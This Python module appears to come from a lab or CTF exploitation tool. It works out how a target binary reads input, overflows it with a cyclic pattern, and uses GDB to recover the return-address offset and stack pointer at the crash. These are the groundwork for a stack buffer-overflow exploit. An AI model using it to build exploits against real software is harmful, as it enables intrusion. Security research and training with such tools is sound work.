"""Input mode detection and EIP offset finding via GDB batch mode."""
from __future__ import annotations

import re
import string
import subprocess
import tempfile
from pathlib import Path
from typing import NamedTuple

from .config import Config
from .recon import ReconResult


class ProbeResult(NamedTuple):
    offset: int
    esp_at_crash: int  # ESP register value right after the crash — used to locate the buffer


# ---------------------------------------------------------------------------
# Cyclic pattern (de Bruijn-based, compatible with labtool)
# ---------------------------------------------------------------------------

def cyclic(length: int) -> bytes:
    out: list[str] = []
    for a in string.ascii_uppercase:
        for b in string.ascii_lowercase:
            for c in string.digits:
                out.append(a + b + c)
                if sum(len(x) for x in out) >= length:
                    return "".join(out)[:length].encode()
    return "".join(out)[:length].encode()


def cyclic_find(value: int, length: int = 8192) -> int:
    needle = value.to_bytes(4, "little")
    haystack = cyclic(length)
    idx = haystack.find(needle)
    return idx


# ---------------------------------------------------------------------------
# Input mode detection
# ---------------------------------------------------------------------------

def detect_input_mode(binary: Path, cfg: Config, strings_found: dict | None = None) -> str:
    """
    Return one of: 'stdin', 'file-raw', 'file-size-data', 'unknown'.

    Strategy (in priority order):
    1. If binary strings contain format indicators ('record','render','size') → file-size-data
    2. Run with no args AND with empty stdin — if both exit non-zero with no output → file mode
    3. Run with a valid size-data file → if it produces output → file-size-data confirmed
    4. Run with empty stdin and it waits or produces output → stdin
    """
    # 1. String-based heuristic (most reliable)
    file_format_indicators = ("record", "render", "rendering")
    if strings_found:
        found_keys = {k.lower() for k in strings_found.keys()}
        found_vals = " ".join(str(v) for v in strings_found.keys()).lower()
        if any(ind in found_vals for ind in file_format_indicators):
            return _detect_file_format(binary, cfg)

    # Also check raw binary strings
    try:
        raw_strings = subprocess.run(
            ["strings", "-a", "-n", "4", str(binary)],
            capture_output=True, text=True, timeout=5
        ).stdout.lower()
        if any(ind in raw_strings for ind in file_format_indicators):
            return _detect_file_format(binary, cfg)
    except Exception:
        pass

    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)

    def run(*args: str, stdin_data: bytes = b"") -> tuple[int | None, str]:
        cmd = wrapper + [str(binary)] + list(args)
        try:
            r = subprocess.run(
                cmd, input=stdin_data, capture_output=True, env=env, timeout=3
            )
            return r.returncode, (r.stdout + r.stderr).decode("latin-1", errors="replace")
        except subprocess.TimeoutExpired:
            return None, ""
        except Exception as e:
            return -1, str(e)

    # 2. No-args vs stdin comparison
    rc_noargs, out_noargs = run()
    rc_stdin, out_stdin = run(stdin_data=b"\n")

    usage_keywords = ("usage", "argument", "filename", "file", "open", "argv")
    if any(kw in out_noargs.lower() for kw in usage_keywords):
        return _detect_file_format(binary, cfg)

    # Both exit non-zero with no output → binary probably needs a file arg
    if (rc_noargs is not None and rc_noargs != 0 and not out_noargs.strip() and
            rc_stdin is not None and rc_stdin != 0 and not out_stdin.strip()):
        return _detect_file_format(binary, cfg)

    # 3. stdin: binary waits for input (timeout) or produced output on stdin
    if rc_stdin is None:  # timed out = waiting for stdin
        return "stdin"
    if rc_stdin == 0 or out_stdin.strip():
        return "stdin"

    return "unknown"


def _detect_file_format(binary: Path, cfg: Config) -> str:
    """Distinguish raw-file from size-data-file format."""
    wrapper = cfg.wrapper_parts()
    env = dict(cfg.env)
    with tempfile.NamedTemporaryFile(mode="wb", suffix=".inp", delete=False) as f:
        f.write(b"5 hello\n")
        tmp = Path(f.name)
    try:
        cmd = wrapper + [str(binary), str(tmp)]
        r = subprocess.run(cmd, capture_output=True, env=env, timeout=3)
        out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
        # If binary outputs "size" or "record" or echoes "5" it understood the format
        if any(kw in out.lower() for kw in ("size", "record", "render", "5")):
            return "file-size-data"
        return "file-raw"
    except Exception:
        return "file-raw"
    finally:
        tmp.unlink(missing_ok=True)


# ---------------------------------------------------------------------------
# GDB probe for offset
# ---------------------------------------------------------------------------

def _gdb_script(binary: Path, input_path: Path, input_mode: str, cfg: Config) -> str:
    eip = cfg.eip_register()
    lines = [
        "unset environment",
    ]
    for k, v in cfg.env.items():
        lines.append(f"set env {k}={v}")

    wrapper_str = cfg.target.wrapper.strip()
    if wrapper_str:
        lines.append(f"set exec-wrapper {wrapper_str}")

    lines.append(f"file {binary}")
    lines.append("set disassembly-flavor intel")
    lines.append("set pagination off")
    lines.append("set confirm off")
    lines.append("handle SIGSEGV stop nopass")

    if input_mode == "stdin":
        lines.append(f"run < {input_path}")
    else:
        lines.append(f"run {input_path}")

    lines.append(f"printf \"EIP=0x%x\\n\", (unsigned int){eip}")
    lines.append("printf \"ESP=0x%x\\n\", (unsigned int)$esp")
    lines.append("quit")
    return "\n".join(lines)


def find_offset(
    binary: Path,
    input_mode: str,
    cfg: Config,
    verbose: bool = False,
) -> ProbeResult | None:
    pattern = cyclic(cfg.probe.pattern_length)

    with tempfile.NamedTemporaryFile(mode="wb", suffix=".cyclic", delete=False) as f:
        if input_mode == "file-size-data":
            # Large size value to force overflow, then cyclic pattern as data
            payload = f"{cfg.probe.pattern_length + 1000} ".encode() + pattern + b"\n"
        else:
            payload = pattern + b"\n"
        f.write(payload)
        input_path = Path(f.name)

    with tempfile.NamedTemporaryFile(mode="w", suffix=".gdb", delete=False) as f:
        f.write(_gdb_script(binary, input_path, input_mode, cfg))
        gdb_script_path = Path(f.name)

    try:
        result = subprocess.run(
            ["gdb", "--batch", "-x", str(gdb_script_path)],
            capture_output=True,
            timeout=cfg.probe.gdb_timeout + 5,
        )
        output = (result.stdout + result.stderr).decode("latin-1", errors="replace")
        if verbose:
            print(output)

        # Try our printf marker first
        m = re.search(r"EIP=0x([0-9a-fA-F]+)", output)
        if m:
            eip_val = int(m.group(1), 16)
        else:
            # Fallback: parse GDB register dump
            reg = "rip" if cfg.target.arch == "x86_64" else "eip"
            m = re.search(rf"{reg}\s+(0x[0-9a-fA-F]+)", output)
            if not m:
                # Last resort: look for address in crash line
                m = re.search(r"0x([0-9a-fA-F]{6,8})\s+in\s+\?\?", output)
                if not m:
                    return None
            eip_val = int(m.group(1), 16)

        if eip_val == 0 or eip_val == 0xDEADBEEF:
            return None

        offset = cyclic_find(eip_val)
        if offset == -1:
            needle_be = eip_val.to_bytes(4, "big")
            offset = cyclic(8192).find(needle_be)
        if offset == -1:
            return None

        # Extract ESP — tells us exactly where the stack was at crash time.
        # buffer_start ≈ esp_at_crash - offset - 4
        m_esp = re.search(r"ESP=0x([0-9a-fA-F]+)", output)
        esp_at_crash = int(m_esp.group(1), 16) if m_esp else 0
        return ProbeResult(offset=offset, esp_at_crash=esp_at_crash)

    except subprocess.TimeoutExpired:
        return None
    finally:
        input_path.unlink(missing_ok=True)
        gdb_script_path.unlink(missing_ok=True)
